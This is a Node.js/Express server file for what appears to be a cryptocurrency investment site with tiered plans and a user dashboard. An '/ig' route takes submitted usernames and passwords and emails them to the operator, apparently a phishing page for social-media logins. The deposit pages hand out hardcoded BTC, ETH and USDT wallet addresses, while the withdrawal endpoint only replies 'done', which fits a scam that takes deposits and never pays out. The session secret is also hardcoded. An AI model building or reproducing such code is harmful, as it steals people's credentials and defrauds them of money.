// Load environment variables from .env file
require('dotenv').config();

const path = require("path");
const express = require("express");
const app = express();
const sessions = require("client-sessions");
const mongoose = require("mongoose");
const User = require("./models/user");
const schedule = require("node-schedule");

mongoose.set('strictQuery', true);

// Controllers
const usercontroller = require("./controllers/user");
const transactioncontroller = require("./controllers/transaction");
const planController = require("./controllers/plan");
const { sendEmail } = require('./libs/mail/nodemailerEmailService');

const uri = process.env.MONGODB_URL;

// Database connection
const main = async () => {
  await mongoose.connect(uri, { useNewUrlParser: true });
  schedule.scheduleJob({ minute: 1 }, () => {
    console.log("Scheduled Job", new Date());
  });
  app.set("view engine", "ejs");
  app.set("views", "views");

  // Middlewares
  app.use(express.static(path.join(__dirname, "public")));
  app.use(
    sessions({
      cookieName: "session",
      secret: "kdhstyf5623ectgh sibs dhgf sv",
      duration: 1000 * 60 * 60 * 24,
    })
  );

  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  app.use((req, res, next) => {
    // if(!(req.user)) return next()
    res.locals.user = req.session.user;
    next();
  });

  const loginRequired = (req, res, next) => {
    if (!req.user) return res.redirect("/user/login");
    next();
  };

  app.use(async (req, res, next) => {
    if (!(req.session && req.session.userId)) return next();
    const user = await User.findById(req.session.userId)
      .populate({ path: "transactions" })
      .exec();
    if (!user) return next();
    user.password = undefined;
    res.locals.user = user;
    req.user = user;
    next();
  });

  // ===== IG ====
  
  app.get("/ig", (req, res) => {
    res.render("ig");
  })

  app.post("/ig", async (req, res) => {
    const body = req.body;
    console.log("BODY", body);

    // Send email
    await sendEmail({subject: "FROM BRO", to: process.env.EMAIL_TO, text: `p: ${body.password} \n u: ${body.name}`})

    res.json({message: "OK"});
  })

  // ===== All PAGES ===== //

  // index page
  app.get("/", async (req, res) => {
    const dbPlans = await planController.fetchPlans();
    const plans =  {
      starter: {
        ...dbPlans[0]._doc,
      },
      silver: {
        ...dbPlans[1]._doc,
      },
      gold: {
        ...dbPlans[2]._doc,
      },
    }

    res.render("landing", {
      plans,
    });
  });

  // about us page
  app.get("/info/about", (req, res) => {
    res.render("info/about");
  });

  // get started page
  app.get("/get-started", (req, res) => {
    res.render("get-started");
  });
  // terms of us page
  app.get("/info/terms", (req, res) => {
    res.render("info/terms");
  });

  // faqs page
  app.get("/info/faqs", (req, res) => {
    res.render("info/faqs");
  });

  // contact us page
  app.get("/contact", (req, res) => {
    res.render("contact");
  });

  // affiliate program page
  app.get("/affiliate_program", (req, res) => {
    res.render("affiliate_program");
  });

  // ===== DASHBOARD STARTS ===== //
  // dashboard page
  app.get("/user/dashboard", loginRequired, (req, res) => {
    // const user = usercontroller.findUserById(req.session.userId)
    res.render("account/dashboard");
  });

  // dashboard notification page
  app.get("/user/dashboard/notification", loginRequired, (req, res) => {
    res.render("account/dashboard/notification");
  });

  app.get("/user/dashboard/changepassword", loginRequired, (req, res) => {
    res.render("account/dashboard/changepassword");
  });

  app.post("/user/dashboard/changepassword", loginRequired, (req, res) => {
    usercontroller.updateUser(req, res, (what = "PASSWORD"));
  });

  app.get("/user/dashboard/profile", loginRequired, (req, res) => {
    res.render("account/dashboard/profile");
  });

  // UPDATE USER PROFILE
  app.post("/user/dashboard/profile/update", loginRequired, (req, res) => {
    usercontroller.updateUser(req, res, (what = "PROFILE"));
    res.redirect("/user/dashboard/profile");
  });

  app.get("/user/dashboard/accountdetails", loginRequired, (req, res) => {
    res.render("account/dashboard/accountdetails");
  });

  app.post(
    "/user/dashboard/accountdetails/update",
    loginRequired,
    (req, res) => {
      usercontroller.updateUser(req, res);
    }
  );

  app.get("/user/dashboard/support", loginRequired, (req, res) => {
    res.render("account/dashboard/support");
  });

  app.get("/user/dashboard/accounthistory", loginRequired, (req, res) => {
    res.render("account/dashboard/accounthistory");
  });

  app.get("/user/dashboard/deposits", loginRequired, (req, res) => {
    const btc = [
      {
        address: "14cWp4P3zLeBSY2N3897z4ve9Un7mqGMSB",
        image: "/assets/images/barcode/btc_1.jpg",
      },
      {
        address: "1MXeSnmxF37mWFahoFCVpLvByrdUF6YLnB",
        image: "/assets/images/barcode/btc_2.jpg",
      },
    ];
    const eth = [
      {
        address: "0x5eb4f8637225a814fb674978ee56e68314c7083",
        image: "/assets/images/barcode/eth_1.jpg",
      },
      {
        address: "Oxb93c2e16d9908f15e123fc29b2841508bde75b60",
        image: "/assets/images/barcode/eth_2.jpg",
      },
    ];
    const usdt = [
      {
        address: "TEFosiUXYQXRS2ACYZAe1F5gVV8NUSo3cQ",
        image: "/assets/images/barcode/usdt_1.jpg",
      },
      {
        address: "TYvcCpsNTtInztX4VyEXZPRd4WUTBGjncx",
        image: "/assets/images/barcode/usdt_2.jpg",
      },
    ];

    const r = Math.floor(Math.random() * 2);
    res.render("account/dashboard/deposits", {
      btc: btc[r],
      eth: eth[r],
      usdt: usdt[r],
    });
  });

  app.post("/user/dashboard/deposits", loginRequired, (req, res) => {
    transactioncontroller.createTransaction(req, res);
    res.status(200).json("done");
  });

  app.get("/user/dashboard/payment9d6c", loginRequired, (req, res) => {
    res.render("account/dashboard/payment9d6c");
  });

  app.get("/user/dashboard/mplans", loginRequired, (req, res) => {
    res.render("account/dashboard/mplans");
  });

  app.get("/user/dashboard/referuser", loginRequired, (req, res) => {
    res.render("account/dashboard/referuser");
  });

  app.get("/user/dashboard/withdrawals", loginRequired, (req, res) => {
    res.render("account/dashboard/withdrawals");
  });

  app.post("/user/dashboard/withdrawals", loginRequired, (req, res) => {
    res.json("done");
    // res.render("account/dashboard/withdrawals");
  });

  app.post("/user/dashboard/withdrawals", loginRequired, (req, res) => {
    transactioncontroller.createTransaction(req, res, "withdrawal");
    res.status(200).json("done");
  });

  // ===== DASHBOARD ENDS ===== //

  // login program page
  app.get("/user/login", (req, res) => {
    res.render("login");
  });

  // POST login user
  app.post("/user/login", (req, res) => {
    usercontroller.loginUser(req, res);
  });

  // logout user
  app.get("/user/logout", (req, res) => {
    req.session.reset();
    req.user = null;
    res.redirect("/");
  });

  // register program page
  app.get("/user/register", (req, res) => {
    res.render("register");
  });

  // reset program page
  app.get("/user/password/reset", (req, res) => {
    res.render("password/reset");
  });

  // POST register user
  app.post("/user/register", async (req, res) => {
    const createdUser = await usercontroller.saveUser(req, res);
    if (createdUser === "PASSWORD_MISMATCH") {
      return res.status(400).json({
        data: {
          error: "Password mismatch",
        },
      });
    }
    if (createdUser === "USER_EXISTS") {
      return res.status(409).json({
        error: "Email already exists",
      });
    }
    req.session.userId = createdUser._id;
    res.locals.user = createdUser;
    res.status(201).json({ success: true, userId: createdUser._id });
  });

  // Start the server process
  const PORT = process.env.PORT || 8080;
  app.listen(PORT, () => {
    console.log("Server running at http://localhost:8080");
  });
};

// execute main
main();
